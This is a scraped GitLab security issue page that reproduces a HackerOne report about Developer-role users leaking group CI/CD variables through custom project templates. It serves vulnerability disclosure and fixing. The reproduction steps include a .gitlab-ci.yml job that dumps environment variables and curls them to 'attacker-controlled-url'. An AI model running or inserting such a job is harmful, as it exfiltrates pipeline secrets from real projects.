info\u003c/h4\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;73:1-107:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem:         Ubuntu 20.04  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eProxy:          no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eCurrent User:   git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing RVM:      no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRuby Version:   3.0.6p216  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGem Version:    3.4.13  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eBundler Version:2.4.13  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRake Version:   13.0.6  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRedis Version:  6.2.11  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSidekiq Version:6.5.7  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGo Version:     unknown\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:        16.0.4-ee  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRevision:       7d6834bd32e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDirectory:      /opt/gitlab/embedded/service/gitlab-rails  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Adapter:     PostgreSQL  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Version:     13.11  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eURL:            http://x.x.x.x  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eHTTP Clone URL: http://x.x.x.x/some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSSH Clone URL:  git@x.x.x.x:some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eElasticsearch:  no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGeo:            no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing LDAP:     no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing Omniauth: yes  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eOmniauth Providers:\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:        14.20.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRepository storages:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;109:1-109:12\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;111:1-111:72\&quot; dir=\&quot;auto\&quot;\u003eDeveloper of a group can leak group or any subgroup’s CI/CD variables.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;113:1-113:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-attachments\&quot; class=\&quot;anchor\&quot; href=\&quot;#attachments\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAttachments\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;115:1-115:77\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;115:1-115:12\&quot;\u003eWarning:\u003c/strong\u003e Attachments received through HackerOne, please exercise caution!\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;117:1-119:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;117:1-117:89\&quot;\u003e\u003ca data-sourcepos=\&quot;117:3-117:89\&quot; href=\&quot;https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehigh1.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;118:1-119:0\&quot;\u003e\u003ca data-sourcepos=\&quot;118:3-118:89\&quot; href=\&quot;https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehigh2.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;120:1-120:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-how-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#how-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eHow To Reproduce\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;122:1-122:57\&quot; dir=\&quot;auto\&quot;\u003ePlease add \u003ca data-sourcepos=\&quot;122:12-122:40\&quot; href=\&quot;https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereproducibility information\u003c/a\u003e to this section:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;124:1-127:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;124:1-124:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;125:1-125:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;126:1-126:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;:warning: **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**\n\n**[HackerOne report #2021616](https://hackerone.com/reports/2021616)** by `theluci` on 2023-06-12, assigned to @ottilia_westerlund:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\nHello,   \nGitlab recently fixed several bugs that allowed a developer to import a project and leak group’s CI/CD variables. To protect against these types of attacks, Gitlab set the minimum role for importing projects to maintainer.  \nGitlab also made the Custom project templates functionality reusable by developers in enterprise edition.  \nHowever, I found a bug using which a Developer can leak group or any subgroup’s CI/CD variables using Custom project templates functionality.\n\n####  Background\n\nGitlab provides a **Premium/Ultimate** feature [custom project templates functionality.](https://docs.gitlab.com/ee/user/group/custom_project_templates.html)  \nThe owner of the top-level group can set a subgroup to be used as a source of custom templates for new projects in the group and in any of the subgroups.\n\n####  Vulnerability\n\nWhen issue https://gitlab.com/gitlab-org/gitlab/-/issues/407374 was fixed gitlab changed importing logic as follows,  \nWhen a member imports a project where specific members are **Allowed to merge/Allowed to push and merge** -\n\n![high1.png](https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png)\n\nThen Gitlab replaces `user_id` of the member allowed to merge with the `user_id` of the member importing the project.  \n**That is, the member importing the project gets Allowed to merge/Allowed to push and merge access on the protected branch.**\n\n\u003c------------------------------------------Important----------------------------------------------\u003e  \nIt was probably thought that only maintainers/owners can import a project, thus, them getting allowed to merge access will not be a bug.  \nHowever, Custom project template functionality internally imports the template project.  \nThus, **if any maintainer, owner, or any other member has allowed to merge permission on protected branch of any of the templates.** Then, developer can just import the template (using custom project template functionality) and get allowed to merge setting on the protected branch.  \n\u003c------------------------------------------------------------------------------------------------------\u003e\n\n####  Steps to reproduce  \n(Your instance must have an ultimate trial)\n\n1. `victim` creates a group `victim-group`.  \n2. `victim` creates a subgroup `subgroup-to-be-template` and template projects `template1`,`template2` inside.  \n3. `victim` goes to `http://\u003cYour_Instance_IP\u003e/groups/\u003cvictim-group\u003e/-/edit`, **Expand Custom project templates** and select `subgroup-to-be-template`  \n4. `victim` goes to template1 repository settings `http://\u003cYour_Instance_IP\u003e/\u003cvictim-group\u003e/\u003csubgroup-to-be-template\u003e/template1/-/settings/repository`, **Expand Protected branches** and gives himself *Allowed to merge* OR *Allowed to push and merge* access on protected branch.\n\n![high2.png](https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png)\n\nIn a real-world scenario, it may not be the owner but any member (maybe a maintainer or some other member) that has **Allowed to merge/Allowed to push and merge** access on protected branch of any of the templates.  \nIt might also be possible that no roles are **Allowed to merge/Allowed to push and merge** but specific users (any user).\n\nAs `victim`,  \n5. `victim` goes to `http://\u003cYour_Instance_IP\u003e/groups/\u003cvictim-group\u003e/-/settings/ci_cd`, **Expand Variables ** and adds some CI/CD variables.  \n6. `victim` goes to `http://\u003cYour_Instance_IP\u003e/groups/\u003cvictim-group\u003e/-/group_members` and adds `attacker` as *Developer*.\n\nAs `attacker`,  \n7. `attacker` goes to `victim-group`, clicks on **new project** and chooses Create from template.  \n8. `attacker` uses `template1` and creates `attacker-project`  \n`attacker` now have **Allowed to merge/Allowed to push and merge** access on protected branch of `attacker-project`.  \n9. `attacker` adds the following **.gitlab-ci.yml file**\n\n```  \njob_name:      \n script:      \n   - export \u003e test.txt      \n   - curl -X POST --data \&quot;$(cat test.txt)\&quot; attacker-controlled-url  \n```\n\nThe group&#39;s CI/CD variables are sent to ***attacker-controlled-url***.\n\n####  Output of checks\n\nThis bug happens on Self-hosted Gitlab Instance.\n\n####  Results of GitLab environment info\n\n```  \nSystem information  \nSystem:         Ubuntu 20.04  \nProxy:          no  \nCurrent User:   git  \nUsing RVM:      no  \nRuby Version:   3.0.6p216  \nGem Version:    3.4.13  \nBundler Version:2.4.13  \nRake Version:   13.0.6  \nRedis Version:  6.2.11  \nSidekiq Version:6.5.7  \nGo Version:     unknown\n\nGitLab information  \nVersion:        16.0.4-ee  \nRevision:       7d6834bd32e  \nDirectory:      /opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:     PostgreSQL  \nDB Version:     13.11  \nURL:            http://x.x.x.x  \nHTTP Clone URL: http://x.x.x.x/some-group/some-project.git  \nSSH Clone URL:  git@x.x.x.x:some-group/some-project.git  \nElasticsearch:  no  \nGeo:            no  \nUsing LDAP:     no  \nUsing Omniauth: yes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:        14.20.0  \nRepository storages:  \n- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket  \nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Impact\n\nDeveloper of a group can leak group or any subgroup’s CI/CD variables.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [high1.png](https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png)\n* [high2.png](https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;gitlab-org/gitlab&quot;,&quot;iid&quot;:416244,&quot;issuableId&quot;:129835514,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2741139,&quot;authorName&quot;:&quot;GitLab SecurityBot&quot;,&quot;authorUsername&quot;:&quot;gitlab-securitybot&quot;,&quot;authorWebUrl&quot;:&quot;/gitlab-securitybot&quot;,&quot;createdAt&quot;:&quot;2023-06-26T09:09:56+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:278964,&quot;projectPath&quot;:&quot;gitlab&quot;,&quot;projectNamespace&quot;:&quot;gitlab-org&quot;,&quot;updatedAt&quot;:&quot;2023-12-15T19:03:00+00:00&quot;,&quot;updatedBy&quot;:{&quot;name&quot;:&quot;Kevin Morrison&quot;,&quot;path&quot;:&quot;/kmorrison1&quot;},&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality</h1>
</div>
<div class="description">
<div class="md"><p data-sourcepos="1:1-1:247" dir="auto"><gl-emoji title="warning sign" data-name="warning" data-unicode-version="4.0">⚠</gl-emoji> <strong data-sourcepos="1:11-1:247">Please read <a data-sourcepos="1:25-1:125" href="https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md">the process</a> on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.</strong></p>&#x000A;<p data-sourcepos="3:1-3:131" dir="auto"><strong data-sourcepos="3:1-3:70"><a data-sourcepos="3:3-3:68" href="https://hackerone.com/reports/2021616" rel="nofollow noreferrer noopener" target="_blank">HackerOne report #2021616</a></strong> by <code data-sourcepos="3:76-3:82">theluci</code> on 2023-06-12, assigned to <a href="/ottilia_westerlund" data-reference-type="user" data-user="12746880" data-container="body" data-placement="top" class="gfm gfm-project_member js-user-link" title="Ottilia Westerlund">@ottilia_westerlund</a>:</p>&#x000A;<p data-sourcepos="5:1-5:87" dir="auto"><a data-sourcepos="5:1-5:17" href="#report">Report</a> | <a data-sourcepos="5:21-5:47" href="#attachments">Attachments</a> | <a data-sourcepos="5:51-5:87" href="#how-to-reproduce">How To Reproduce</a></p>&#x000A;<h2 data-sourcepos="7:1-7:9" dir="auto">&#x000A;<a id="user-content-report" class="anchor" href="#report" aria-hidden="true"></a>Report</h2>&#x000A;<p data-sourcepos="9:1-12:143" dir="auto">Hello,<br data-sourcepos="9:10-9:10">&#x000A;Gitlab recently fixed several bugs that allowed a developer to import a project and leak group’s CI/CD variables. To protect against these types of attacks, Gitlab set the minimum role for importing projects to maintainer.<br data-sourcepos="10:227-10:227">&#x000A;Gitlab also made the Custom project templates functionality reusable by developers in enterprise edition.<br data-sourcepos="11:108-11:108">&#x000A;However, I found a bug using which a Developer can leak group or any subgroup’s CI/CD variables using Custom project templates functionality.</p>&#x000A;<h4 data-sourcepos="14:1-14:16" dir="auto">&#x000A;<a id="user-content-background" class="anchor" href="#background" aria-hidden="true"></a>Background</h4>&#x000A;<p data-sourcepos="16:1-17:153" dir="auto">Gitlab provides a <strong data-sourcepos="16:19-16:38">Premium/Ultimate</strong> feature <a data-sourcepos="16:48-16:157" href="https://docs.gitlab.com/ee/user/group/custom_project_templates.html" rel="nofollow noreferrer noopener" target="_blank">custom project templates functionality.</a><br data-sourcepos="16:160-16:160">&#x000A;The owner of the top-level group can set a subgroup to be used as a source of custom templates for new projects in the group and in any of the subgroups.</p>&#x000A;<h4 data-sourcepos="19:1-19:19" dir="auto">&#x000A;<a id="user-content-vulnerability" class="anchor" href="#vulnerability" aria-hidden="true"></a>Vulnerability</h4>&#x000A;<p data-sourcepos="21:1-22:107" dir="auto">When issue <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/407374" data-reference-type="issue" data-original="https://gitlab.com/gitlab-org/gitlab/-/issues/407374" data-link="false" data-link-reference="true" data-project="278964" data-issue="126675225" data-project-path="gitlab-org/gitlab" data-iid="407374" data-issue-type="issue" data-container="body" data-placement="top" title="User with developer role (group) can modify Protected branches setting on imported project and leak group CI/CD variables" class="gfm gfm-issue">#407374 (closed)</a> was fixed gitlab changed importing logic as follows,<br data-sourcepos="21:119-21:119">&#x000A;When a member imports a project where specific members are <strong data-sourcepos="22:60-22:105">Allowed to merge/Allowed to push and merge</strong> -</p>&#x000A;<p data-sourcepos="24:1-24:88" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/3efc73f5bf3de6bfcb525c7a79c291206bf69aad/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33666161613830632d376239612d343666352d383134342d3266383562656265623938352f68696768312e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png"><img data-sourcepos="24:1-24:88" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="high1.png" data-canonical-src="https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/3efc73f5bf3de6bfcb525c7a79c291206bf69aad/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33666161613830632d376239612d343666352d383134342d3266383562656265623938352f68696768312e706e67"></a></p>&#x000A;<p data-sourcepos="26:1-27:125" dir="auto">Then Gitlab replaces <code data-sourcepos="26:23-26:29">user_id</code> of the member allowed to merge with the <code data-sourcepos="26:73-26:79">user_id</code> of the member importing the project.<br data-sourcepos="26:120-26:120">&#x000A;<strong data-sourcepos="27:1-27:125">That is, the member importing the project gets Allowed to merge/Allowed to push and merge access on the protected branch.</strong></p>&#x000A;<p data-sourcepos="29:1-33:104" dir="auto">&lt;------------------------------------------Important----------------------------------------------&gt;<br data-sourcepos="29:102-29:102">&#x000A;It was probably thought that only maintainers/owners can import a project, thus, them getting allowed to merge access will not be a bug.<br data-sourcepos="30:139-30:139">&#x000A;However, Custom project template functionality internally imports the template project.<br data-sourcepos="31:90-31:90">&#x000A;Thus, <strong data-sourcepos="32:7-32:132">if any maintainer, owner, or any other member has allowed to merge permission on protected branch of any of the templates.</strong> Then, developer can just import the template (using custom project template functionality) and get allowed to merge setting on the protected branch.<br data-sourcepos="32:284-32:284">&#x000A;&lt;------------------------------------------------------------------------------------------------------&gt;</p>&#x000A;<h4 data-sourcepos="35:1-35:26" dir="auto">&#x000A;<a id="user-content-steps-to-reproduce" class="anchor" href="#steps-to-reproduce" aria-hidden="true"></a>Steps to reproduce</h4>&#x000A;<p data-sourcepos="36:1-36:43" dir="auto">(Your instance must have an ultimate trial)</p>&#x000A;<ol data-sourcepos="38:1-42:0" dir="auto">&#x000A;<li data-sourcepos="38:1-38:45">&#x000A;<code data-sourcepos="38:5-38:10">victim</code> creates a group <code data-sourcepos="38:30-38:41">victim-group</code>.</li>&#x000A;<li data-sourcepos="39:1-39:112">&#x000A;<code data-sourcepos="39:5-39:10">victim</code> creates a subgroup <code data-sourcepos="39:33-39:55">subgroup-to-be-template</code> and template projects <code data-sourcepos="39:81-39:89">template1</code>,<code data-sourcepos="39:93-39:101">template2</code> inside.</li>&#x000A;<li data-sourcepos="40:1-40:152">&#x000A;<code data-sourcepos="40:5-40:10">victim</code> goes to <code data-sourcepos="40:22-40:75">http://&lt;Your_Instance_IP&gt;/groups/&lt;victim-group&gt;/-/edit</code>, <strong data-sourcepos="40:79-40:113">Expand Custom project templates</strong> and select <code data-sourcepos="40:127-40:149">subgroup-to-be-template</code>&#x000A;</li>&#x000A;<li data-sourcepos="41:1-42:0">&#x000A;<code data-sourcepos="41:5-41:10">victim</code> goes to template1 repository settings <code data-sourcepos="41:52-41:149">http://&lt;Your_Instance_IP&gt;/&lt;victim-group&gt;/&lt;subgroup-to-be-template&gt;/template1/-/settings/repository</code>, <strong data-sourcepos="41:153-41:181">Expand Protected branches</strong> and gives himself <em data-sourcepos="41:201-41:218">Allowed to merge</em> OR <em data-sourcepos="41:223-41:249">Allowed to push and merge</em> access on protected branch.</li>&#x000A;</ol>&#x000A;<p data-sourcepos="43:1-43:88" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/f40d455ab5abe7383748d0c4011687c62de45622/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39386136393339302d343963632d346466312d396539302d6334323538366161336366662f68696768322e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png"><img data-sourcepos="43:1-43:88" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="high2.png" data-canonical-src="https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/f40d455ab5abe7383748d0c4011687c62de45622/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39386136393339302d343963632d346466312d396539302d6334323538366161336366662f68696768322e706e67"></a></p>&#x000A;<p data-sourcepos="45:1-46:121" dir="auto">In a real-world scenario, it may not be the owner but any member (maybe a maintainer or some other member) that has <strong data-sourcepos="45:117-45:162">Allowed to merge/Allowed to push and merge</strong> access on protected branch of any of the templates.<br data-sourcepos="45:217-45:217">&#x000A;It might also be possible that no roles are <strong data-sourcepos="46:45-46:90">Allowed to merge/Allowed to push and merge</strong> but specific users (any user).</p>&#x000A;<p data-sourcepos="48:1-50:121" dir="auto">As <code data-sourcepos="48:5-48:10">victim</code>,<br data-sourcepos="48:15-48:15">&#x000A;5. <code data-sourcepos="49:5-49:10">victim</code> goes to <code data-sourcepos="49:22-49:85">http://&lt;Your_Instance_IP&gt;/groups/&lt;victim-group&gt;/-/settings/ci_cd</code>, **Expand Variables ** and adds some CI/CD variables.<br data-sourcepos="49:143-49:143">&#x000A;6. <code data-sourcepos="50:5-50:10">victim</code> goes to <code data-sourcepos="50:22-50:84">http://&lt;Your_Instance_IP&gt;/groups/&lt;victim-group&gt;/-/group_members</code> and adds <code data-sourcepos="50:97-50:104">attacker</code> as <em data-sourcepos="50:110-50:120">Developer</em>.</p>&#x000A;<p data-sourcepos="52:1-56:56" dir="auto">As <code data-sourcepos="52:5-52:12">attacker</code>,<br data-sourcepos="52:17-52:17">&#x000A;7. <code data-sourcepos="53:5-53:12">attacker</code> goes to <code data-sourcepos="53:24-53:35">victim-group</code>, clicks on <strong data-sourcepos="53:49-53:63">new project</strong> and chooses Create from template.<br data-sourcepos="53:100-53:100">&#x000A;8. <code data-sourcepos="54:5-54:12">attacker</code> uses <code data-sourcepos="54:21-54:29">template1</code> and creates <code data-sourcepos="54:45-54:60">attacker-project</code><br data-sourcepos="54:64-54:64">&#x000A;<code data-sourcepos="55:2-55:9">attacker</code> now have <strong data-sourcepos="55:21-55:66">Allowed to merge/Allowed to push and merge</strong> access on protected branch of <code data-sourcepos="55:99-55:114">attacker-project</code>.<br data-sourcepos="55:119-55:119">&#x000A;9. <code data-sourcepos="56:5-56:12">attacker</code> adds the following <strong data-sourcepos="56:34-56:56">.gitlab-ci.yml file</strong></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="58:1-63:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">job_name:      </span>&#x000A;<span id="LC2" class="line" lang="plaintext"> script:      </span>&#x000A;<span id="LC3" class="line" lang="plaintext">   - export &gt; test.txt      </span>&#x000A;<span id="LC4" class="line" lang="plaintext">   - curl -X POST --data "$(cat test.txt)" attacker-controlled-url  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="65:1-65:70" dir="auto">The group's CI/CD variables are sent to <em data-sourcepos="65:41-65:69"><strong data-sourcepos="65:41-65:69">attacker-controlled-url</strong></em>.</p>&#x000A;<h4 data-sourcepos="67:1-67:22" dir="auto">&#x000A;<a id="user-content-output-of-checks" class="anchor" href="#output-of-checks" aria-hidden="true"></a>Output of checks</h4>&#x000A;<p data-sourcepos="69:1-69:48" dir="auto">This bug happens on Self-hosted Gitlab Instance.</p>&#x000A;<h4 data-sourcepos="71:1-71:40" dir="auto">&#x000A;<a id="user-content-results-of-gitlab-environment-info" class="anchor" href="#results-of-gitlab-environment-info" aria-hidden="true"></a>Results of GitLab environment info</h4>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="73:1-107:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">System information  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">System:         Ubuntu 20.04  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">Proxy:          no  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">Current User:   git  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">Using RVM:      no  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">Ruby Version:   3.0.6p216  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">Gem Version:    3.4.13  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">Bundler Version:2.4.13  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">Rake Version:   13.0.6  </span>&#x000A;<span id="LC10" class="line" lang="plaintext">Redis Version:  6.2.11  </span>&#x000A;<span id="LC11" class="line" lang="plaintext">Sidekiq Version:6.5.7  </span>&#x000A;<span id="LC12" class="line" lang="plaintext">Go Version:     unknown</span>&#x000A;<span id="LC13" class="line" lang="plaintext"></span>&#x000A;<span id="LC14" class="line" lang="plaintext">GitLab information  </span>&#x000A;<span id="LC15" class="line" lang="plaintext">Version:        16.0.4-ee  </span>&#x000A;<span id="LC16" class="line" lang="plaintext">Revision:       7d6834bd32e  </span>&#x000A;<span id="LC17" class="line" lang="plaintext">Directory:      /opt/gitlab/embedded/service/gitlab-rails  